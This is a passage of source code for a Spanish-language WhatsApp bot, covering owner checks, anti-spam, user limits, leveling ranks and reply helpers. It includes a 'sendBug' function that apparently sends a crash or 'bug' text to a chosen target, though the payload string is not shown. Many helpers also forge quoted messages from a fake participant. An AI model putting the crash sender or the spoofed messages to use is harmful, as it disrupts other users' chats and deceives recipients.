			const autonomo = mek.key.fromMe ? true : false
			const botNumber = teslagod.user.jid
			const botNumber2 = await "@" + teslagod.user.jid.split('@')[0]
			const teslauser = ["51995386439@s.whatsapp.net"]
			const ownerNumber = [botcontrol[0], botcontrol[1], botcontrol[2], botcontrol[3], botcontrol[4], botNumber, autonomo, teslauser[0]]
			const Matt_M = ownerNumber.includes(sender)
			const isTeslaUser = teslauser.includes(sender)
			const isOwner = ownerNumber.includes(sender)
			const conts = mek.key.fromMe ? teslagod.user.jid : teslagod.contacts[sender] || {
				notify: jid.replace(/@.+/, '')
			}
			const pushname = mek.key.fromMe ? teslagod.user.name : conts.notify || conts.vname || conts.name || "A/Z"
			const desc_bio = await teslagod.getStatus(sender)
			//===================================================//
			const totalchat = await teslagod.chats.all()
			const groupMetadata = isGroup ? await teslagod.groupMetadata(from) : ""
			const groupId = isGroup ? groupMetadata.jid : ""
			const groupOwner = isGroup ? groupMetadata.owner : ""
			const groupDesc = isGroup ? groupMetadata.desc : ""
			const groupName = isGroup ? groupMetadata.subject : ""
			const groupMembers = isGroup ? groupMetadata.participants : ""
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ""
			//
			const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
			const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
			//
			const isLevelingOn = isGroup ? _leveling.includes(from) : false
			const isAntiLink = isGroup ? _antilink.includes(from) : false
			const isAntiLinkuwu = isGroup ? _antilink2.includes(from) : false
			const isWelcom = isGroup ? _welcom.includes(from) : false
			const isFakes1 = isGroup ? _antifakes1.includes(from) : false
			const isFakes2 = isGroup ? _antifakes2.includes(from) : false
			const isAntivirtex = isGroup ? _antivirtex.includes(from) : false
			const isEstranjeros = isGroup ? _estranjerosnot.includes(from) : false
			const isAnime = isGroup ? _anime.includes(from) : false
			const isDiversion = isGroup ? _diversion.includes(from) : false
			const isNsfw = isGroup ? _nsfw.includes(from) : false
			const isSimi = isGroup ? _simi.includes(from) : false
			//
			const isBanChat = _chatban.includes(from)
			const isRegistro = checkRegisteredUser(sender)
			const isBaneado = _ban.includes(sender)
			//========================⚡========================//
			if (isBanChat && !autonomo && !Matt_M && !isTeslaUser) return
			//======================= ª =======================//
			colors = ['red', 'white', 'black', 'blue', 'yellow', 'green', 'silver', 'gold', 'cyan', 'teal', 'magenta', 'pink', 'orange', 'lime']
			let isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
			let isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			let isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			let isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			let isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			let isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
			let isViewOnce = (type === 'viewOnceMessage')
			//========================⚡========================//
			let {
				isFiltered,
				addFilter
			} = require('./libreria/antispam')
			if (isCmd && isFiltered(from) && !isGroup) {
				console.log(chalk.redBright("\n[ ! ]"), chalk.keyword("green")(" [ SPAMER CMD] Comando :"), chalk.whiteBright(`${command}`), chalk.greenBright("="), chalk.keyword("green")(senderNumber) + "\n")
				return teslagod.sendMessage(from, `*Espere unos segundos antes de usar otro comando ✓*`, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net",
							"remoteJid": "0@s.whatsapp.net"
						},
						"message": {
							"groupInviteMessage": {
								"groupJid": "51995386439-1616169743@g.us",
								"inviteCode": "m",
								"groupName": "P",
								"caption": `[ ! ] ${pushname} Por favor no sature al bot ;-;`,
								'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/Hmmm.jpg')
							}
						}
					}
				})
			}
			if (isCmd && isFiltered(from) && isGroup) {
				console.log(chalk.redBright("\n[ ! ]"), chalk.keyword("green")(" [ SPAMER CMD] Comando :"), chalk.whiteBright(`${command}`), chalk.greenBright("="), chalk.keyword("green")(senderNumber) + "\n")
				return teslagod.sendMessage(from, `*Espere unos segundos antes de usar otro comando ✓*`, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net",
							"remoteJid": "0@s.whatsapp.net"
						},
						"message": {
							"groupInviteMessage": {
								"groupJid": "51995386439-1616169743@g.us",
								"inviteCode": "m",
								"groupName": "P",
								"caption": `[ ! ] ${pushname} Por favor no sature al bot ;-;`,
								'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/Hmmm.jpg')
							}
						}
					}
				})
			}
			//========================⚡========================//
			try {
				var userimg = await teslagod.getProfilePicture(sender, 'image')
			} catch {
				var userimg = 'https://i.ibb.co/jhQ7gL0/Sin-Perfil-F.jpg'
			}
			try {
				var userthumb = await getBuffer(userimg) //perfil de usuario
			} catch {
				var userthumb = sinthumb
			}
			//
			try {
				var botimg = await teslagod.getProfilePicture(botNumber, 'image')
			} catch {
				var botimg = 'https://i.ibb.co/jhQ7gL0/Sin-Perfil-F.jpg'
			}
			try {
				var bothumb = await getBuffer(botimg) //perfil del bot
			} catch {
				var bothumb = sinthumb
			}
			//
			try {
				var gpimg = await teslagod.getProfilePicture(from, 'image')
			} catch {
				var gpimg = 'https://i.ibb.co/jhQ7gL0/Sin-Perfil-F.jpg'
			}
			try {
				var gpthumb = await getBuffer(gpimg) //perfil de grupo
			} catch {
				var gpthumb = sinthumb
			}
			//
			let datos_rg = _registered.filter(function(scode) {
				return scode.id == sender
			})
			let datauser = (datos_rg.length > 0) ? datos_rg[0] : null //datos registrados
			let redes = ["https://youtube.com/channel/UC_Pp8pT9vbT15k5_-i6oseA", "https://vm.tiktok.com/ZMLjP4RBS/", "https://fb.watch/b7LOc9_LU2/"]
			let reddom = redes[Math.floor(Math.random() * redes.length)] //
			//========================⚡========================//
			hit_today.push(command)
			const totalhit = JSON.parse(fs.readFileSync('./basededatos/json/totalcmd.json'))[0].totalcmd
			//=======================WTF!=======================//
			const fakemek = mek
			const estarder = {
				key: {
					fromMe: false,
					"participant": "0@s.whatsapp.net",
					"remoteJid": "51995386439-1604595598@g.us"
				},
				"message": {
					orderMessage: {
						itemCount: 737,
						status: 200,
						thumbnail: fs.readFileSync('./multimedia/imagenes/logo.jpg'),
						surface: 200,
						message: saludHora + `\n${pushname}\n`,
						orderTitle: 'Matt_M',
						sellerJid: '0@s.whatsapp.net'
					}
				},
				contextInfo: {
					"forwardingScore": 999,
					"isForwarded": true
				},
				sendEphemeral: true
			}
			const ftroli = {
				key: {
					fromMe: false,
					"participant": "0@s.whatsapp.net",
					"remoteJid": "51995386439-1604595598@g.us"
				},
				"message": {
					orderMessage: {
						itemCount: 2022,
						status: 200,
						thumbnail: fs.readFileSync('./multimedia/imagenes/logo.jpg'),
						surface: 200,
						message: `${NameBot}`,
						orderTitle: 'Matt_M',
						sellerJid: '0@s.whatsapp.net'
					}
				},
				contextInfo: {
					"forwardingScore": 999,
					"isForwarded": true
				},
				sendEphemeral: true
			}
			const fdoc = {
				key: {
					participant: '0@s.whatsapp.net'
				},
				message: {
					documentMessage: {
						title: `${NameBot}`,
						jpegThumbnail: fs.readFileSync('./multimedia/imagenes/logo.jpg')
					}
				}
			}
			const fvn = {
				key: {
					participant: `0@s.whatsapp.net`,
					...(from ? {
						remoteJid: "51995386439-1613049930@g.us"
					} : {})
				},
				message: {
					"audioMessage": {
						"mimetype": "audio/ogg; codecs=opus",
						"seconds": 359996400,
						"ptt": "true"
					}
				}
			}
			const fgif = {
				key: {
					participant: `0@s.whatsapp.net`,
					...(from ? {
						remoteJid: "51995386439-1613049930@g.us"
					} : {})
				},
				message: {
					"videoMessage": {
						"title": `${NameBot}`,
						"h": `UwU`,
						'seconds': '359996400',
						'gifPlayback': 'true',
						'caption': `${NameBot}`,
						'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/logo.jpg')
					}
				}
			}
			const fgclink = {
				key: {
					participant: "0@s.whatsapp.net",
					"remoteJid": "0@s.whatsapp.net"
				},
				"message": {
					"groupInviteMessage": {
						"groupJid": "51995386439-1616169743@g.us",
						"inviteCode": "m",
						"groupName": "P",
						"caption": `${NameBot}`,
						'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/logo.jpg')
					}
				}
			}
			const rptardidos = {
				key: {
					participant: "0@s.whatsapp.net",
					"remoteJid": "0@s.whatsapp.net"
				},
				"message": {
					"groupInviteMessage": {
						"groupJid": "51995386439-1616169743@g.us",
						"inviteCode": "m",
						"groupName": "P",
						"caption": `${pushname}: ${txt}`,
						'jpegThumbnail': userthumb
					}
				}
			}
			const fvideo = {
				key: {
					fromMe: false,
					participant: `0@s.whatsapp.net`,
					...(from ? {
						remoteJid: "51995386439-1613049930@g.us"
					} : {})
				},
				message: {
					"videoMessage": {
						"title": `${NameBot}`,
						"h": `UwU`,
						'seconds': '359996400',
						'caption': `${NameBot}`,
						'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/logo.jpg')
					}
				}
			}
			const floc = {
				key: {
					participant: '0@s.whatsapp.net'
				},
				message: {
					locationMessage: {
						name: `${NameBot}`,
						jpegThumbnail: fs.readFileSync('./multimedia/imagenes/logo.jpg')
					}
				}
			}
			const fkontak = {
				key: {
					participant: `0@s.whatsapp.net`,
					...(from ? {
						remoteJid: `51995386439-1614953337@g.us`
					} : {})
				},
				message: {
					'contactMessage': {
						'displayName': `${NameBot}`,
						'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=51995386439:51995386439\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
						'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/logo.jpg'),
						thumbnail: fs.readFileSync('./multimedia/imagenes/logo.jpg'),
						sendEphemeral: true
					}
				}
			}
			//=====================Funciones========================//
			let sendBug = async (target, teks) => {
				if (!teks) teks = `${modokuaker}`
				await teslagod.relayWAMessage(teslagod.prepareMessageFromContent(target, teslagod.prepareDisappearingMessageSettingContent(0), {}), {
					waitForAck: true
				})
				teslagod.sendMessage(target, teks, 'conversation')
			} //Darle un uso justo y no para arruinar grupos por envidia o para llamar la atención ;)

			let mentions = (teks, memberr, id) => {
				id == null || id == undefined || id == false ?
					teslagod.sendMessage(from, teks.trim(), extendedText, {
						contextInfo: {
							mentionedJid: memberr
						},
					}) :
					teslagod.sendMessage(from, teks.trim(), extendedText, {
						quoted: fakemek,
						contextInfo: {
							mentionedJid: memberr
						},
					})
			}

			// Soy una vergüenza para la programación xdxdxdd //
			let reply = (texto) => {
				try {
					teslagod.updatePresence(from, Presence.composing)
					teslagod.sendMessage(from, texto, MessageType.text, {
						sendEphemeral: true,
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender]
						}
					})
				} catch (err) {
					console.log(err)
					teslagod.sendMessage(from, `*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`, MessageType.text, {
						sendEphemeral: true,
						quoted: mek,
						contextInfo: {
							mentionedJid: [sender]
						}
					})
				}
			}

			let regply = `*[ ! ] No estas registrado en mi base de datos*\n\n_Ejemplo para registrarse_ :\n${prefix}rg TuNombre|TuEdad`
			let rgeply = (gtext) => {
				teslagod.sendMessage(from, gtext, MessageType.text, {
					sendEphemeral: true,
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `[ ! ] ${pushname} Debe de registrarse para comenzar a usar al bot`,
							"body": `Prefijo: " ${prefix} "`,
							"previewType": "PHOTO",
							"thumbnail": mylogo,
							"sourceUrl": `${reddom}`
						}
					}
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			let procesando = (waitext) => {
				teslagod.sendMessage(from, waitext, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net"
						},
						message: {
							documentMessage: {
								title: `♻️ ${NameBot}\n📲 ${pushname}`,
								jpegThumbnail: fs.readFileSync('./multimedia/imagenes/ProcesHd.jpg')
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					}
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			let creando = (waittext) => {
				teslagod.sendMessage(from, waittext, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net"
						},
						message: {
							documentMessage: {
								title: `🎨 ${NameBot}\n📲 ${pushname}`,
								jpegThumbnail: fs.readFileSync('./multimedia/imagenes/DesignHD.jpg')
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					}
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			let convirtiendo = (waitttext) => {
				teslagod.sendMessage(from, waitttext, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net"
						},
						message: {
							documentMessage: {
								title: `🧰 ${NameBot}\n📲 ${pushname}`,
								jpegThumbnail: fs.readFileSync('./multimedia/imagenes/WorkingHD.jpg')
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					}
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			let buscando = (waittttext) => {
				teslagod.sendMessage(from, waittttext, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net"
						},
						message: {
							documentMessage: {
								title: `🔎 ${NameBot}\n📲 ${pushname}`,
								jpegThumbnail: fs.readFileSync('./multimedia/imagenes/BusquedaHD.jpg')
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					}
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			let okply = (oktext) => {
				teslagod.sendMessage(from, oktext, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net",
							"remoteJid": "0@s.whatsapp.net"
						},
						"message": {
							"groupInviteMessage": {
								"groupJid": "51995386439-1616169743@g.us",
								"inviteCode": "m",
								"groupName": "P",
								"caption": `${fechaCompleta}`,
								'jpegThumbnail': gpthumb
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					}
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			let godeply = (godtext) => {
				teslagod.sendMessage(from, godtext, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net",
							"remoteJid": "0@s.whatsapp.net"
						},
						"message": {
							"groupInviteMessage": {
								"groupJid": "51995386439-1616169743@g.us",
								"inviteCode": "m",
								"groupName": "P",
								"caption": `${fechaCompleta}`,
								'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/Ok-HD.jpg')
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					}
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			let enviarIMG = (myimg, mythb, mytext) => {
				teslagod.sendMessage(from, myimg, image, {
					thumbnail: mythb,
					sendEphemeral: true,
					quoted: {
						key: {
							fromMe: false,
							"participant": "0@s.whatsapp.net",
							"remoteJid": "51995386439-1604595598@g.us"
						},
						"message": {
							orderMessage: {
								itemCount: 737,
								status: 200,
								thumbnail: userthumb,
								surface: 200,
								message: `${pushname} [_>] ${command}`,
								orderTitle: 'Matt_M',
								sellerJid: '0@s.whatsapp.net'
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					},
					caption: mytext
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			let miniaturaNK = (imgth, texks) => {
				teslagod.sendMessage(from, imgth, image, {
					thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'),
					quoted: {
						key: {
							fromMe: false,
							"participant": "0@s.whatsapp.net",
							"remoteJid": "51995386439-1604595598@g.us"
						},
						"message": {
							orderMessage: {
								itemCount: 737,
								status: 200,
								thumbnail: bothumb,
								surface: 200,
								message: `${pushname} => ${UwU}`,
								orderTitle: 'Matt_M',
								sellerJid: '0@s.whatsapp.net'
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					},
					caption: texks
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			let thumbNK = (thimg, texth) => {
				teslagod.sendMessage(from, thimg, image, {
					thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'),
					quoted: {
						key: {
							fromMe: false,
							"participant": "0@s.whatsapp.net",
							"remoteJid": "51995386439-1604595598@g.us"
						},
						"message": {
							orderMessage: {
								itemCount: 737,
								status: 200,
								thumbnail: userthumb,
								surface: 200,
								message: `[ ${command} ☰ ]`,
								orderTitle: 'Matt_M',
								sellerJid: '0@s.whatsapp.net'
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					},
					caption: texth
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			let enviarbuton = (id, text1, desc1, but = [], options = {}) => {
				const buttonMessage = {
					contentText: text1,
					footerText: desc1,
					buttons: but,
					headerType: 1
				}
				teslagod.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}

			const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
				kma = gam1
				mhan = await teslagod.prepareMessage(from, kma, location)
				const buttonMessages = {
					locationMessage: mhan.message.locationMessage,
					contentText: text1,
					footerText: desc1,
					buttons: but,
					headerType: 6
				}
				teslagod.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
			}

			let pickRandom = (list) => {
				return list[Math.floor(Math.random() * list.length)]
			}

			let isUrl = (url) => {
				return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}

			let funar = function(from, orangnya) {
				for (let i of orangnya) {
					teslagod.groupRemove(from, [i])
				}
			}

			//======================OS INFO========================//
			let {
				wa_version,
				mcc,
				mnc,
				os_version,
				device_manufacturer,
				device_model
			} = teslagod.user.phone
			const used = process.memoryUsage()
			const cpus = os.cpus().map(cpu => {
				cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
				return cpu
			})
			const cpu = cpus.reduce((last, cpu, _, {
				length
			}) => {
				last.total += cpu.total
				last.speed += cpu.speed / length
				last.times.user += cpu.times.user
				last.times.nice += cpu.times.nice
				last.times.sys += cpu.times.sys
				last.times.idle += cpu.times.idle
				last.times.irq += cpu.times.irq
				return last
			}, {
				speed: 0,
				total: 0,
				times: {
					user: 0,
					nice: 0,
					sys: 0,
					idle: 0,
					irq: 0
				}
			})
			//========================⚡========================//
			//Agradecido a su creador \\//
			teslagod.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
				let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
				let buffer
				if (options && (options.packname || options.author)) {
					buffer = await writeExifImg(buff, options)
				} else {
					buffer = await imageToWebp(buff)
				}
				return await teslagod.sendMessage(jid, buffer, MessageType.sticker, {
					quoted,
					...options
				})
			}

			teslagod.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
				let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
				let buffer
				if (options && (options.packname || options.author)) {
					buffer = await writeExifVid(buff, options)
				} else {
					buffer = await videoToWebp(buff)
				}
				return await teslagod.sendMessage(jid, buffer, MessageType.sticker, {
					quoted,
					...options
				})
			}
			//========================⚡========================//
			const checkLimit = (sender) => {
				let found = false
				for (let lmt of _limit) {
					if (lmt.id === sender) {
						let limitCounts = limitawal - lmt.limit
						if (limitCounts <= 0) return teslagod.sendMessage(from, `*[ ! ] ${pushname} Su límite para usar al bot se agotaron ;-;*\nSi sube de nivel se le regalarán : ~+3 de limite~\n_~ᴬˡ ᵈᵘᵉⁿ̃ᵒ ᵈᵉˡ ᵇᵒᵗ ⁿᵒ ˡᵉ ᵃᶠᵉᶜᵗᵃʳᵃ ᵉˡ ˡᶦᵐᶦᵗᵉ~_ `, MessageType.text, {
							sendEphemeral: true,
							quoted: {
								key: {
									participant: "0@s.whatsapp.net",
									"remoteJid": "0@s.whatsapp.net"
								},
								"message": {
									"groupInviteMessage": {
										"groupJid": "51995386439-1616169743@g.us",
										"inviteCode": "m",
										"groupName": "P",
										"caption": `${NameBot}`,
										'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/press-f.jpg')
									}
								}
							},
							contextInfo: {
								mentionedJid: [sender]
							}
						})

						reply(`*┏━━⊱ 「 LIMITE 」*
*┗⊱ ${pushname} Tu limite restante es* : _${limitCounts}_`)
						found = true
					}
				}
				if (found === false) {
					let obj = {
						id: sender,
						limit: 0
					}
					_limit.push(obj)
					fs.writeFileSync('./basededatos/usuariosgod/limit.json', JSON.stringify(_limit))
					reply(`*┏━━⊱ 「 LIMITE 」*
*┗⊱ ${pushname} Tu limite restante es* : _${limitCounts}_`)
				}
			}
			const isLimit = (sender) => {
				if (isOwner) {
					return false;
				}
				let position = false
				for (let i of _limit) {
					if (i.id === sender) {
						let limits = i.limit
						if (limits >= limitawal) {
							position = true
							//reply(`*[ ! ] Lo siento ${pushname} te quedaste sin límites para seguir usando al bot T~T*\nˢᶦ ˢᵘᵇᵉˢ ᵈᵉ ⁿᶦᵛᵉˡ• ˢᵉ ˡᵉ ʳᵉᵍᵃˡᵃʳᵃⁿ ~⁺³ ᵈᵉ ˡᶦ́ᵐᶦᵗᵉ~`)
							return true
						} else {
							_limit
							position = true
							return false
						}
					}
				}
				if (position === false) {
					const obj = {
						id: sender,
						limit: 0
					}
					_limit.push(obj)
					fs.writeFileSync('./basededatos/usuariosgod/limit.json', JSON.stringify(_limit))
					return false
				}
			}
			//====================LIMITE========================//
			const bayarLimit = (sender, amount) => {
				let position = false
				Object.keys(_limit).forEach((i) => {
					if (_limit[i].id === sender) {
						position = i
					}
				})
				if (position !== false) {
					_limit[position].limit -= amount
					fs.writeFileSync('./basededatos/usuariosgod/limit.json', JSON.stringify(_limit))
				}
			}
			const limitAdd = (sender) => {
				let position = false
				Object.keys(_limit).forEach((i) => {
					if (_limit[i].id == sender) {
						position = i
					}
				})
				if (position !== false) {
					_limit[position].limit += 1
					fs.writeFileSync('./basededatos/usuariosgod/limit.json', JSON.stringify(_limit))
				}
			}
			//====================NIVEL========================//
			const getLevelingXp = (sender) => {
				let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
					}
				})
				if (position !== false) {
					return _level[position].xp
				}
			}

			const getLevelingLevel = (sender) => {
				let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
					}
				})
				if (position !== false) {
					return _level[position].level
				}
			}

			const getLevelingId = (sender) => {
				let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
					}
				})
				if (position !== false) {
					return _level[position].id
				}
			}

			const addLevelingXp = (sender, amount) => {
				let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
					}
				})
				if (position !== false) {
					_level[position].xp += amount
					fs.writeFileSync('./basededatos/usuariosgod/nivel.json', JSON.stringify(_level))
				}
			}

			const addLevelingLevel = (sender, amount) => {
				let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
					}
				})
				if (position !== false) {
					_level[position].level += amount
					fs.writeFileSync('./basededatos/usuariosgod/nivel.json', JSON.stringify(_level))
				}
			}

			const addLevelingId = (sender) => {
				const obj = {
					id: sender,
					xp: 1,
					level: 1
				}
				_level.push(obj)
				fs.writeFileSync('./basededatos/usuariosgod/nivel.json', JSON.stringify(_level))
			}

			//========================⚡========================//
			const levelRole = getLevelingLevel(sender, _level)
			var role = 'Esclavo Nivel-Ⅰ'
			if (levelRole <= 2) {
				role = 'Esclavo Nivel-Ⅱ'
			} else if (levelRole <= 3) {
				role = 'Esclavo Nivel-Ⅲ'
			} else if (levelRole <= 4) {
				role = 'Esclavo Nivel-Ⅳ'
			} else if (levelRole <= 5) {
				role = 'Esclavo Nivel-Ⅴ'
			} else if (levelRole <= 6) {
				role = 'Novato ✓'
			} else if (levelRole <= 7) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 8) {
				role = 'Recluta Nivel-Ⅰ'
			} else if (levelRole <= 10) {
				role = 'Recluta Nivel-Ⅱ'
			} else if (levelRole <= 12) {
				role = 'Recluta Nivel-Ⅲ'
			} else if (levelRole <= 14) {
				role = 'Recluta Nivel-Ⅳ'
			} else if (levelRole <= 16) {
				role = 'Recluta Nivel-Ⅴ'
			} else if (levelRole <= 19) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 20) {
				role = 'Soldado De Primera Clase'
			} else if (levelRole <= 22) {
				role = 'Soladado Con Honores'
			} else if (levelRole <= 25) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 26) {
				role = 'Especialista'
			} else if (levelRole <= 29) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 30) {
				role = 'Cabo Sub-1'
			} else if (levelRole <= 32) {
				role = 'Cabo Sub-2'
			} else if (levelRole <= 34) {
				role = 'Cabo Sub-3'
			} else if (levelRole <= 37) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 38) {
				role = 'Sargento'
			} else if (levelRole <= 40) {
				role = 'Sargento de Segunda Clase'
			} else if (levelRole <= 42) {
				role = 'Sargento de Primera Clase'
			} else if (levelRole <= 44) {
				role = 'Sargento Maestro'
			} else if (levelRole <= 46) {
				role = 'Sargento Primero'
			} else if (levelRole <= 48) {
				role = 'Sargento Mayor'
			} else if (levelRole <= 50) {
				role = 'Sargento Mayor de Comando'
			} else if (levelRole <= 51) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 52) {
				role = 'Teniente'
			} else if (levelRole <= 54) {
				role = 'Teniente Primero'
			} else if (levelRole <= 57) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 58) {
				role = 'Capitan'
			} else if (levelRole <= 60) {
				role = 'Capitan Teniente'
			} else if (levelRole <= 63) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 64) {
				role = 'Mayor'
			} else if (levelRole <= 67) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 68) {
				role = 'Teniente coronel'
			} else if (levelRole <= 71) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 72) {
				role = 'Coronel [－]'
			} else if (levelRole <= 74) {
				role = 'Coronel [＝]'
			} else if (levelRole <= 76) {
				role = 'Coronel [≡]'
			} else if (levelRole <= 78) {
				role = 'Coronel [≥]'
			} else if (levelRole <= 80) {
				role = 'Coronel [≧]'
			} else if (levelRole <= 83) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 84) {
				role = 'General de brigada ㈠'
			} else if (levelRole <= 86) {
				role = 'General de brigada ㈡'
			} else if (levelRole <= 88) {
				role = 'General de brigada ㈢'
			} else if (levelRole <= 91) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 92) {
				role = 'General ︾'
			} else if (levelRole <= 94) {
				role = 'General ︾︾'
			} else if (levelRole <= 96) {
				role = 'General ︾︾︾'
			} else if (levelRole <= 99) {
				role = '*FELICIDADES CRACK*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 100) {
				role = 'Lider De Alto Mando •'
			} else if (levelRole <= 102) {
				role = 'Lider De Alto Mando ••'
			} else if (levelRole <= 104) {
				role = 'Lider De Alto Mando ⊙'
			} else if (levelRole <= 106) {
				role = 'Lider De Alto Mando ⊚'
			} else if (levelRole <= 108) {
				role = 'Lider De Alto Mando ⊛'
			} else if (levelRole <= 111) {
				role = '*FELICIDADES*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 112) {
				role = 'Retirado Con Honores'
			} else if (levelRole <= 115) {
				role = '*FELICIDADES MASTER*\n_Estas apunto de pasar a nuevos niveled sigue asi!!!_ ⇑'
			} else if (levelRole <= 116) {
				role = 'Heroe Bronce ☆'
			} else if (levelRole <= 118) {
				role = 'Heroe Plata ☆'
			} else if (levelRole <= 120) {
				role = 'Heroe Oro ☆'
			} else if (levelRole <= 122) {
